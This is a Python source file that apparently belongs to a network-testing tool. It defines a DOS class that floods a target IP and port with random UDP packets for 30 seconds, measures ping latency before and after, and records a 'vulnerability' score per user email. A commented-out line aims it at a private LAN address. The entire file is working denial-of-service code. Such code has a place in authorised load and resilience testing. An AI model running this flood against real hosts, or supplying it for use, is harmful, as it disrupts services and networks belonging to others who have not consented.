import socket
import secrets
import time
import subprocess
import os
import subprocess
import statistics

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

class DOS:
    def __init__(self, ip, port, email):
        self.sock       = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.ip         = ip
        self.port       = int(port)
        self.email      = email
        self.sleep      = 0.1
        self.start_time = time.time()
    
    def connect(self):
        try:
            self.sock.connect((self.ip, self.port))
            return "OK"
        except Exception as e:
            print(e)
            return "Couldnt connect"

    def update_scan_to_json(self, percent):
        from PYProtocol import add_to_dos_json
        res = f"{self.ip}:::{self.port}:::{percent}:::1"
        add_to_dos_json(self.email, res)


    def exploit(self):
        packets_sent = 0
        # Run the loop for 30 seconds

        start_speed = self.ping_router()
        if start_speed == "NO":
            self.update_scan_to_json("Could'nt send packets to host")
            return
        
        while (time.time() - self.start_time) < 30:
            self.sock.send(secrets.randbelow(10*1000).to_bytes(2, byteorder='big'))
            print(f"Sent: {packets_sent}", end="\r")
            packets_sent += 1
        
        
        end_speed = self.ping_router()
        if end_speed == "NO":
            self.update_scan_to_json(100)
            return
        
        diff = end_speed - start_speed
        if diff < 0 or 0 <= diff < 10:
            end =  0
        elif 10 <= diff <= 20:
            end =  50
        elif 20 < diff <= 40:
            end =  75
        else:
            end = 95
        
        self.update_scan_to_json(end)

    
    def ping_router(self):
        ping_command = ['ping', '-c', '10', '-w', '3', self.ip]
        ping_process = subprocess.Popen(ping_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        round_trip_times = []
        for line in ping_process.stdout:
            line = line.decode().strip()
            if line.startswith('64 bytes'):
                words = line.split()
                rtt = float(words[6].split('=')[1])
                round_trip_times.append(rtt)
        ping_process.terminate()

        if len(round_trip_times) > 0:
            avg_rtt = statistics.mean(round_trip_times)
            print(f"Average round-trip time: {avg_rtt:.2f} ms")

            return avg_rtt
        else:
            print("No packets received")
            return "NO"

# dosKit = DOS('192.168.14.122', 8080, 'roi@gmail.com')
# a = dosKit.connect()
# print(a)